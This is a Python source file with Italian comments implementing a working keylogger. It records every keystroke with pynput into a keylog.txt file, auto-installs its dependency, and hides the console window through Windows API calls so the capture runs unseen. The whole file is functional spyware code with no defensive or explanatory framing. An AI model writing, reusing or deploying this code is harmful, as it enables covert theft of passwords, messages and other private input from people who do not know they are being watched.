import subprocess
import sys
import ctypes
from pathlib import Path
from pynput.keyboard import Listener, Key

pressed_keys = []

# Funzione per installare moduli mancanti
def install_module(module_name):
    subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])

# Prova a importare pynput, installalo se non è presente
try:
    from pynput.keyboard import Listener, Key
except ImportError:
    print("Il modulo 'pynput' non è installato. Sto installando...")
    install_module('pynput')
    from pynput.keyboard import Listener, Key

# Definisci una directory fissa (hard coded)
directory = r'C:/Users/mdesp/OneDrive/Desktop/KL'  # Cambia questo percorso con la directory desiderata
directory_path = Path(directory)

# Verifica se la directory esiste, altrimenti esci con un errore
if not directory_path.exists():
    print(f"Errore: la directory '{directory}' non esiste.")
    sys.exit(1)

# Percorso completo del file di log
log_file_path = directory_path / 'keylog.txt'

# Funzione che gestisce la pressione dei tasti
def on_press(key):
    print(f'Tasto premuto: {key}')
    pressed_keys.append(key)
    
    # Converti i tasti in un formato leggibile
    key_str = ''
    if hasattr(key, 'char'):
        key_str = key.char if key.char is not None else ''
    else:
        key_str = f'<{key}>'
    
    # Salva il tasto nel file
    try:
        with open(log_file_path, 'a') as f:
            f.write(key_str)
    except Exception as e:
        print(f'Errore durante la scrittura nel file: {e}')

    # Verifica se il tasto premuto è 'Esc' e chiudi il listener
    if key == Key.esc:
        print("Tasto 'Esc' premuto. Uscita dal programma...")
        return False

# Funzione per nascondere la finestra della console
def hide_console():
    ctypes.windll.kernel32.SetConsoleTitleW("Hidden Console")
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Nascondi la finestra della console
hide_console()

# Avvio del listener per la tastiera
with Listener(on_press=on_press) as listener:
    listener.join()
